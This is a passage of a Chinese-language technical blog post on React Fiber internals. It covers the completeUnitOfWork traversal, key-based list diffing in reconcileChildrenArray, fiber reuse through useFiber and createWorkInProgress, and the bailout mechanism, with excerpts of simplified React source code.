function_">runWithFiberInDEV</span>(<br>        completedWork,<br>        completeWork,<br>        current,<br>        completedWork,<br>        entangledRenderLanes,<br>      );<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      next = <span class="hljs-title function_">completeWork</span>(current, completedWork, entangledRenderLanes);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (enableProfilerTimer &amp;&amp; (completedWork.<span class="hljs-property">mode</span> &amp; <span class="hljs-title class_">ProfileMode</span>) !== <span class="hljs-title class_">NoMode</span>) &#123;<br>      <span class="hljs-comment">// Update render duration assuming we didn&#x27;t error.</span><br>      <span class="hljs-title function_">stopProfilerTimerIfRunningAndRecordIncompleteDuration</span>(completedWork);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (next !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// Completing this fiber spawned new work. Work on that next.</span><br>      workInProgress = next;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> siblingFiber = completedWork.<span class="hljs-property">sibling</span>;<br>    <span class="hljs-keyword">if</span> (siblingFiber !== <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-comment">// If there is more work to do in this returnFiber, do that next.</span><br>      workInProgress = siblingFiber;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// Otherwise, return to the parent</span><br>    <span class="hljs-comment">// $FlowFixMe[incompatible-type] we bail out when we get a null</span><br>    completedWork = returnFiber;<br>    <span class="hljs-comment">// Update the next thing we&#x27;re working on in case something throws.</span><br>    workInProgress = completedWork;<br>  &#125; <span class="hljs-keyword">while</span> (completedWork !== <span class="hljs-literal">null</span>);<br><br>  <span class="hljs-comment">// We&#x27;ve reached the root.</span><br>  <span class="hljs-keyword">if</span> (workInProgressRootExitStatus === <span class="hljs-title class_">RootInProgress</span>) &#123;<br>    workInProgressRootExitStatus = <span class="hljs-title class_">RootCompleted</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>核心操作：</p><ul><li>DOM 准备：在 completeWork 中创建&#x2F;更新 DOM</li><li>副作用收集：通过 firstEffect&#x2F;lastEffect构建线性副作用链表，供提交阶段批量处理</li><li>回溯机制：通过 return 指针实现非递归遍历</li></ul><p><strong>遍历过程图解</strong></p><p>还是以之前的组件树为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;App&gt;<br>  &lt;Header /&gt;<br>  &lt;Content&gt;<br>    &lt;Sidebar /&gt;<br>    &lt;Main /&gt;<br>  &lt;/Content&gt;<br>&lt;/App&gt;<br></code></pre></td></tr></table></figure><p>其链表遍历顺序图：</p><pre class="mermaid">graph LR    A[App] --> B[Header]    B --> C[Content]    C --> D[Sidebar]    D --> E[Main]    E --> F[回溯Content]    F --> G[回溯App]</pre><p>具体步骤：</p><ol><li>performUnitOfWork(App) -&gt; beginWork(App) -&gt; 返回子节点 Header -&gt; workInProgress &#x3D; Header</li><li>workLoopSync -&gt; performUnitOfWork(Header) -&gt; beginWork(Header) -&gt; 无子节点，返回null</li><li>completeUnitOfWork(Header) -&gt; workInProgress &#x3D; Header.siblingFiber(即Content)</li><li>performUnitOfWork(Content) -&gt; beginWork(Content) -&gt; 返回子节点 Sidebar -&gt; workInProgress &#x3D; Sidebar</li><li>workLoopSync -&gt; performUnitOfWork(Sidebar) -&gt; beginWork(Sidebar) -&gt; 无子节点，返回null</li><li>completeUnitOfWork(Sidebar) -&gt; workInProgress &#x3D; Sidebar.siblingFiber(即Main)</li><li>performUnitOfWork(Main) -&gt; beginWork(Main) -&gt; 无子节点无兄弟节点，返回 null</li><li>completeUnitOfWork(Main) -&gt; 无子节点，无兄弟节点 -&gt; return 回溯到 Content -&gt; 无兄弟节点 -&gt; completeUnitOfWork(Content) -&gt; return 回溯到 App -&gt; 遍历结束</li></ol><p><strong>performUnitOfWork 的完整工作流程</strong></p><pre class="mermaid">sequenceDiagram    participant Scheduler    participant performUnitOfWork    participant beginWork    participant completeUnitOfWork    Scheduler->>performUnitOfWork: 分配任务（Fiber节点）    performUnitOfWork->>beginWork: 处理当前节点    alt 有子节点        beginWork-->>performUnitOfWork: 返回子节点    else 无子节点        beginWork-->>performUnitOfWork: null        performUnitOfWork->>completeUnitOfWork: 进入完成阶段        completeUnitOfWork-->>performUnitOfWork: 返回兄弟/父节点    end    performUnitOfWork-->>Scheduler: 返回下一个节点</pre><h2 id="3-3-Diff算法的Fiber化改造"><a href="#3-3-Diff算法的Fiber化改造" class="headerlink" title="3.3 Diff算法的Fiber化改造"></a>3.3 Diff算法的Fiber化改造</h2><h3 id="同级比较（Key优化）在Fiber中的实现"><a href="#同级比较（Key优化）在Fiber中的实现" class="headerlink" title="同级比较（Key优化）在Fiber中的实现"></a>同级比较（Key优化）在Fiber中的实现</h3><p>React 列表元素为什么要加上 key 属性？</p><p>无论是传统 Diff 还是 Fiber Diff，key 的核心作用都是<code>唯一标识同级元素</code>。传统虚拟 DOM Diff 在 key 的利用上有两个瓶颈：</p><p><strong>双指针遍历算法（O(n²) 复杂度）</strong></p><p>传统 Diff 通过两层循环匹配新旧节点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i =<span class="hljs-number">0</span>; i &lt; newChildren.<span class="hljs-property">length</span>; i++) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j =<span class="hljs-number">0</span>; j &lt; oldChildren.<span class="hljs-property">length</span>; j++) &#123;<br>    <span class="hljs-keyword">if</span> (newChild[i].<span class="hljs-property">key</span> === oldChild[j].<span class="hljs-property">key</span>) &#123;<br>      <span class="hljs-comment">// 匹配成功，复用节点</span><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这带来的问题是：</p><ul><li>长度为 n 的列表最坏情况下需要 n² 次比较，性能随列表长度增大急剧下降</li><li>仅能通过位置索引猜测节点移动，容易产生冗余 DOM 操作</li></ul><p><strong>复用粒度有限</strong></p><ul><li>仅能复用虚拟 DOM 节点对象，仍需执行组件的生命周期和 DOM 属性对比</li><li>无法跳过状态未发生改变的组件渲染（比如 shouldComponentUpdate 需手动优化）</li></ul><p>Fiber 架构对比传统虚拟 DOM Diff 在 key 的利用上实现了质的飞跃。</p><p>在 Fiber 架构中，同级比较的核心逻辑集中在 <code>reconcileChildren</code> 函数中，它负责对比新旧子节点并生成新的 Fiber 树。beginWork 函数根据组件类型执行对应处理时触发该函数。</p><p><strong>入口函数：reconcileChildren</strong></p><p>根据当前是首次渲染还是更新调用 mountChildFibers 或 reconcileChildFibers</p><ul><li>mountChildFibers：</li><li>reconcileChildFibers：处理子节点协调的核心逻辑，根据子节点类型做不同处理，比如子节点为数组时调用 <code>reconcileChildrenArray</code> 函数处理。</li></ul><p><strong>核心优化逻辑</strong></p><p>reconcileChildrenArray 采用多阶段遍历 + key 映射表的策略，将时间复杂度优化至O(n)，主要优化包括:</p><ul><li>两轮遍历：先尝试从左到右顺序匹配，再处理移动&#x2F;新增&#x2F;删除</li><li>key 映射：剩余未匹配的旧节点存入map，实现O(1)查找</li><li>节点复用：通过 key 和 type 精确匹配可复用的 Fiber 节点</li><li>最小化 DOM 操作：仅标记需要移动和删除的节点</li></ul><p><strong>源码解析：以 reconcileChildrenArray 为例</strong></p><p>阶段一：顺序遍历匹配（从左到右）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> oldFiber = currentFirstChild; <span class="hljs-comment">// 旧 Fiber 链表头节点</span><br><span class="hljs-keyword">let</span> lastPlacedIndex = <span class="hljs-number">0</span>; <span class="hljs-comment">// 记录最后一个无需移动的节点索引</span><br><span class="hljs-keyword">let</span> newIdx = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">let</span> nextOldFiber = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// 第一轮遍历：顺序匹配 key 相同的节点</span><br><span class="hljs-keyword">for</span> (; oldFiber !== <span class="hljs-literal">null</span> &amp;&amp; newIdx &lt; newChildren.<span class="hljs-property">length</span>; newIdx++) &#123;<br>  <span class="hljs-keyword">if</span> (oldFiber.<span class="hljs-property">index</span> &gt; newIdx) &#123;<br>    nextOldFiber = oldFiber;<br>    oldFiber = <span class="hljs-literal">null</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    nextOldFiber = oldFiber.<span class="hljs-property">sibling</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 尝试复用旧 Fiber（key &amp; type 匹配）</span><br>  <span class="hljs-keyword">const</span> newFiber = <span class="hljs-title function_">updateSlot</span>(returnFiber, oldFiber, newChildren[newIdx], lanes);<br><br>  <span class="hljs-keyword">if</span> (newFiber === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// key 不匹配，跳出循环</span><br>    <span class="hljs-keyword">break</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 标记是否需要移动</span><br>  lastPlacedIndex = <span class="hljs-title function_">placeChild</span>(newFiber, lastPlacedIndex, newIdx);<br>&#125;<br></code></pre></td></tr></table></figure><p>优化点：</p><ul><li>updateSlot：检查 key 和 type，匹配则复用旧 Fiber，否则返回null</li><li>placeChild：比较旧 Fiber 的 index 和 newIdx，决定是否标记 placement（移动）</li></ul><p>阶段二：处理剩余节点<br>情况一：新节点已遍历完</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (newIdx === newChildren.<span class="hljs-property">length</span>) &#123;<br>  <span class="hljs-comment">// 删除剩余旧节点</span><br>  <span class="hljs-title function_">deleteRemainingChildren</span>(returnFiber, oldFiber);<br>  <span class="hljs-keyword">return</span> resultingFirstChild;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化点：直接删除未匹配的旧节点，无需进一步比较</p><p>情况二：旧节点已遍历完</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">if</span> (oldFiber === <span class="hljs-literal">null</span>) &#123;<br>  <span class="hljs-comment">// 创建剩余新节点</span><br>  <span class="hljs-keyword">for</span> (; newIdx &lt; newChildren.<span class="hljs-property">length</span>; newIdx++) &#123;<br>    <span class="hljs-keyword">const</span> newFiber = <span class="hljs-title function_">createChild</span>(returnFiber, newChildren[newIdx], lanes);<br>    <span class="hljs-comment">// 链接到链表</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> resultingFirstChild;<br>&#125;<br></code></pre></td></tr></table></figure><p>优化点：剩余新节点直接创建，无需匹配</p><p>情况三：新旧节点均未遍历完</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 构建旧节点 Map&lt;key|index, Fiber&gt;</span><br><span class="hljs-keyword">const</span> existingChildren = <span class="hljs-title function_">mapRemainingChildren</span>(oldFiber);<br><br><span class="hljs-comment">// 遍历剩余新节点，尝试从 Map 中匹配</span><br><span class="hljs-keyword">for</span> (; newIdx &lt; newChildren.<span class="hljs-property">length</span>; newIdx++) &#123;<br>  <span class="hljs-keyword">const</span> newFiber = <span class="hljs-title function_">updateFromMap</span>(<br>    existingChildren,<br>    returnFiber,<br>    newIdx,<br>    newChildren[newIdx],<br>    lanes,<br>  );<br><br>  <span class="hljs-keyword">if</span> (newFiber !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// 标记移动或复用</span><br>    lastPlacedIndex = <span class="hljs-title function_">placeChild</span>(newFiber, lastPlacedIndex, newIdx);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 删除未匹配的旧节点</span><br>existingChildren.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">child</span> =&gt;</span> <span class="hljs-title function_">deleteChild</span>(returnFiber, child));<br></code></pre></td></tr></table></figure><p>优化点：</p><ul><li>mapRemainingChildren：将剩余旧节点存入 map，key 优先，无 key 时使用 index</li><li>updateFromMap：从 map 中查找可复用节点，减少遍历次数</li><li>placeChild：仅对需要移动的节点标记 placement，减少不必要的 DOM 操作</li></ul><p><strong>key的核心作用</strong></p><ol><li>精确匹配：key 是 React 中节点的唯一标识，应避免复用</li><li>高效复用：通过 key 直接定位旧节点，而非递归比较</li><li>移动优化：key 相同的节点即使位置发生改变，也能被正确标记移动，而非删除重建</li></ol><p><strong>性能对比（传统虚拟 DOM Diff 对比 Fiber Diff）</strong></p><table><thead><tr><th align="left">场景</th><th align="left">传统 Diff</th><th align="left">Fiber Diff</th></tr></thead><tbody><tr><td align="left">时间复杂度</td><td align="left">O(n²)(双指针循环)</td><td align="left">O(n) (map查找)</td></tr><tr><td align="left">DOM 操作</td><td align="left">可能多次移动&#x2F;重建</td><td align="left">仅进行必要更新（placement&#x2F;deletion）</td></tr><tr><td align="left">状态保留</td><td align="left">仅复用 DOM</td><td align="left">组件状态、hooks、ref全保留</td></tr><tr><td align="left">列表渲染</td><td align="left">性能随列表长度下降明显</td><td align="left">万级列表仍然流畅</td></tr></tbody></table><h3 id="节点复用策略与bailout机制"><a href="#节点复用策略与bailout机制" class="headerlink" title="节点复用策略与bailout机制"></a>节点复用策略与bailout机制</h3><p><strong>复用条件：key 和 type 双匹配</strong></p><p>源码入口：reconcileChildFibers -&gt; reconcileChildrenArray &#x2F; updateSlot<br>核心代码逻辑（简化自ReactFiberChild.js）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateSlot</span>(<span class="hljs-params">returnFiber: Fiber, oldFiber: Fiber | <span class="hljs-literal">null</span>, newChild: any, lanes: Lanes</span>): <span class="hljs-title class_">Fiber</span> | <span class="hljs-literal">null</span> &#123;<br>  <span class="hljs-comment">// Update the fiber if the keys match, otherwise return null.</span><br>  <span class="hljs-keyword">const</span> key = oldFiber !== <span class="hljs-literal">null</span> ? oldFiber.<span class="hljs-property">key</span> : <span class="hljs-literal">null</span>;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> newChild === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; newChild !== <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (newChild.<span class="hljs-property">key</span> === key) &#123;<br>      <span class="hljs-keyword">if</span> (newChild.<span class="hljs-property">type</span> === oldFiber?.<span class="hljs-property">type</span>) &#123;<br>        <span class="hljs-comment">// 复用旧 Fiber（保留 state/DOM/hooks）</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_">useFiber</span>(oldFiber, newChild.<span class="hljs-property">props</span>);<br>      &#125;<br>      <span class="hljs-comment">// key 匹配但 type 不匹配，销毁旧节点</span><br>      <span class="hljs-title function_">deleteChild</span>(returnFiber, oldFiber);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 不匹配则创建新节点</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>复用规则</strong></p><ul><li>key 和 type 都相同：调用 useFiber 克隆旧节点，保留：<ul><li>组件实例（class组件）和 hooks 链表（函数式组件）</li><li>DOM 引用（避免重建）</li><li>状态和refs</li></ul></li><li>key 相同，type 不同：销毁旧节点（标记deletion），创建新节点</li><li>key 不同：直接创建新节点</li></ul><p><strong>useFiber实现（状态保留核心）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">useFiber</span>(<span class="hljs-params">fiber: Fiber, pendingProps: mixed</span>): <span class="hljs-title class_">Fiber</span> &#123;<br>  <span class="hljs-comment">// We currently set sibling to null and index to 0 here because it is easy</span><br>  <span class="hljs-comment">// to forget to do before returning it. E.g. for the single child case.</span><br>  <span class="hljs-keyword">const</span> clone = <span class="hljs-title function_">createWorkInProgress</span>(fiber, pendingProps);<br>  clone.<span class="hljs-property">index</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// 重置索引</span><br>  clone.<span class="hljs-property">sibling</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 断开兄弟链接</span><br>  <span class="hljs-keyword">return</span> clone;<br>&#125;<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createWorkInProgress</span>(<span class="hljs-params">current: Fiber, pendingProps: any</span>): <span class="hljs-title class_">Fiber</span> &#123;<br>  <span class="hljs-keyword">let</span> workInProgress = current.<span class="hljs-property">alternate</span>;<br>  <span class="hljs-keyword">if</span> (workInProgress === <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-comment">// We use a double buffering pooling technique because we know that we&#x27;ll</span><br>    <span class="hljs-comment">// only ever need at most two versions of a tree. We pool the &quot;other&quot; unused</span><br>    <span class="hljs-comment">// node that we&#x27;re free to reuse. This is lazily created to avoid allocating</span><br>    <span class="hljs-comment">// extra objects for things that are never updated. It also allow us to</span><br>    <span class="hljs-comment">// reclaim the extra memory if needed.</span><br>    workInProgress = <span class="hljs-title function_">createFiber</span>(<br>      current.<span class="hljs-property">tag</span>,<br>      pendingProps,<br>      current.<span class="hljs-property">key</span>,<br>      current.<span class="hljs-property">mode</span>,<br>    );<br>    workInProgress.<span class="hljs-property">elementType</span> = current.<span class="hljs-property">elementType</span>;<br>    workInProgress.<span class="hljs-property">type</span> = current.<span class="hljs-property">type</span>;<br>    workInProgress.<span class="hljs-property">stateNode</span> = current.<span class="hljs-property">stateNode</span>;<br><br>    <span class="hljs-comment">// 省略部分源码</span><br><br>    workInProgress.<span class="hljs-property">alternate</span> = current;<br>    current.<span class="hljs-property">alternate</span> = workInProgress;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    workInProgress.<span class="hljs-property">pendingProps</span> = pendingProps;<br>    <span class="hljs-comment">// Needed because Blocks store data on type.</span><br>    workInProgress.<span class="hljs-property">type</span> = current.<span class="hljs-property">type</span>;<br><br>    <span class="hljs-comment">// We already have an alternate.</span><br>    <span class="hljs-comment">// Reset the effect tag.</span><br>    workInProgress.<span class="hljs-property">flags</span> = <span class="hljs-title class_">NoFlags</span>;<br><br>    <span class="hljs-comment">// The effects are no longer valid.</span><br>    workInProgress.<span class="hljs-property">subtreeFlags</span> = <span class="hljs-title class_">NoFlags</span>;<br>    workInProgress.<span class="hljs-property">deletions</span> = <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">if</span> (enableProfilerTimer) &#123;<br>      <span class="hljs-comment">// We intentionally reset, rather than copy, actualDuration &amp; actualStartTime.</span><br>      <span class="hljs-comment">// This prevents time from endlessly accumulating in new commits.</span><br>      <span class="hljs-comment">// This has the downside of resetting values for different priority renders,</span><br>      <span class="hljs-comment">// But works for yielding (the common case) and should support resuming.</span><br>      workInProgress.<span class="hljs-property">actualDuration</span> = -<span class="hljs-number">0</span>;<br>      workInProgress.<span class="hljs-property">actualStartTime</span> = -<span class="hljs-number">1.1</span>;<br>    &#125;<br>  &#125;<br><br>  <span class="hljs-comment">// Reset all effects except static ones.</span><br>  <span class="hljs-comment">// Static effects are not specific to a render.</span><br>  workInProgress.<span class="hljs-property">flags</span> = current.<span class="hljs-property">flags</span> &amp; <span class="hljs-title class_">StaticMask</span>;<br>  workInProgress.<span class="hljs-property">childLanes</span> = current.<span class="hljs-property">childLanes</span>;<br>  workInProgress.<span class="hljs-property">lanes</span> = current.<span class="hljs-property">lanes</span>;<br><br>  workInProgress.<span class="hljs-property">child</span> = current.<span class="hljs-property">child</span>;<br>  workInProgress.<span class="hljs-property">memoizedProps</span> = current.<span class="hljs-property">memoizedProps</span>;<br>  workInProgress.<span class="hljs-property">memoizedState</span> = current.<span class="hljs-property">memoizedState</span>;<br>  workInProgress.<span class="hljs-property">updateQueue</span> = current.<span class="hljs-property">updateQueue</span>;<br><br>  <span class="hljs-comment">// Clone the dependencies object. This is mutated during the render phase, so</span><br>  <span class="hljs-comment">// it cannot be shared with the current fiber.</span><br>  <span class="hljs-keyword">const</span> currentDependencies = current.<span class="hljs-property">dependencies</span>;<br>  workInProgress.<span class="hljs-property">dependencies</span> =<br>    currentDependencies === <span class="hljs-literal">null</span><br>      ? <span class="hljs-literal">null</span><br>      : __DEV__<br>        ? &#123;<br>            <span class="hljs-attr">lanes</span>: currentDependencies.<span class="hljs-property">lanes</span>,<br>            <span class="hljs-attr">firstContext</span>: currentDependencies.<span class="hljs-property">firstContext</span>,<br>            <span class="hljs-attr">_debugThenableState</span>: currentDependencies.<span class="hljs-property">_debugThenableState</span>,<br>          &#125;<br>        : &#123;<br>            <span class="hljs-attr">lanes</span>: currentDependencies.<span class="hljs-property">lanes</span>,<br>            <span class="hljs-attr">firstContext</span>: currentDependencies.<span class="hljs-property">firstContext</span>,<br>          &#125;;<br><br>  <span class="hljs-comment">// These will be overridden during the parent&#x27;s reconciliation</span><br>  workInProgress.<span class="hljs-property">sibling</span> = current.<span class="hljs-property">sibling</span>;<br>  workInProgress.<span class="hljs-property">index</span> = current.<span class="hljs-property">index</span>;<br>  workInProgress.<span class="hljs-property">ref</span> = current.<span class="hljs-property">ref</span>;<br>  workInProgress.<span class="hljs-property">refCleanup</span> = current.<span class="hljs-property">refCleanup</span>;<br><br>  <span class="hljs-keyword">if</span> (enableProfilerTimer) &#123;<br>    workInProgress.<span class="hljs-property">selfBaseDuration</span> = current.<span class="hljs-property">selfBaseDuration</span>;<br>    workInProgress.<span class="hljs-property">treeBaseDuration</span> = current.<span class="hljs-property">treeBaseDuration</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// 省略部分源码</span><br><br>  <span class="hljs-keyword">return</span> workInProgress;<br>&#125;<br></code></pre></td></tr></table></figure><p>关键点：</p><ul><li>通过 alternate 指针复用旧 Fiber 对象（双缓冲技术）</li><li>保留 stateNode（DOM&#x2F;实例）和 memoizedState（状态）</li></ul><p><strong>bailout 机制（跳过子树协调）核心逻辑</strong></p><p>源码入口：beginWork -&gt; updateFunctionComponent &#x2F; updateClassComponent</p><p>核心代码逻辑（精简自ReactFiberBeginWork.js）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">updateFunctionComponent</span>(<span class="hljs-params"></span><br><span class="hljs-params">  current: <span class="hljs-literal">null</span> | Fiber,</span><br><span class="hljs-params">  workInProgress: Fiber,</span><br><span class="hljs-params">  Component: any,</span><br><span class="hljs-params">  nextProps: any,</span><br><span class="hljs-params">  renderLanes: Lanes,</span><br><span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> oldProps = current.<span class="hljs-property">memoizedProps</span>;<br>  <span class="hljs-keyword">const</span> newProps = workInProgress.<span class="hljs-property">pendingProps</span>;<br>  <span class="hljs-keyword">if</span> (<br>    oldProps === newProps &amp;&amp; <span class="hljs-comment">// Props 浅比较</span><br>    !<span class="hljs-title function_">hasLegacyContextChanged</span>() &amp;&amp; <span class="hljs-comment">// 旧 Context 未变</span><br>    workInProgress.<span class="hljs-property">type</span> === current.<span class="hljs-property">type</span> &amp;&amp; <span class="hljs-comment">// 组件类型相同</span><br>    !<span class="hljs-title function_">includesSomeLane</span>(renderLanes, current.<span class="hljs-property">lanes</span>) <span class="hljs-comment">// 无高优先级更新</span><br>  ) &#123;<br>    didReceiveUpdate = <span class="hljs-literal">false</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (current !== <span class="hljs-literal">null</span> &amp;&amp; !didReceiveUpdate) &#123;<br>    <span class="hljs-title function_">bailoutHooks</span>(current, workInProgress, renderLanes);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_">bailoutOnAlreadyFinishedWork</span>(current, workInProgress, renderLanes);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_">getIsHydrating</span>() &amp;&amp; hasId) &#123;<br>    <span class="hljs-title function_">pushMaterializedTreeId</span>(workInProgress);<br>  &#125;<br><br>  <span class="hljs-comment">// React DevTools reads this flag.</span><br>  workInProgress.<span class="hljs-property">flags</span> |= <span class="hljs-title class_">PerformedWork</span>;<br>  <span class="hljs-title function_">reconcileChildren</span>(current, workInProgress, nextChildren, renderLanes);<br>  <span class="hljs-keyword">return</span> workInProgress.<span class="hljs-property">child</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>bailout 条件</strong></p><ul><li>props 浅层相等（Object.is比较）</li><li>context 值未变化（新旧 Provider 值浅比较）。</li><li>组件类型相同（无 type 变化）。</li><li>无更高优先级更新（通过 lanes 模型判断）</li></ul><p><strong>bailoutOnAlreadyFinishedWork 实现</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span 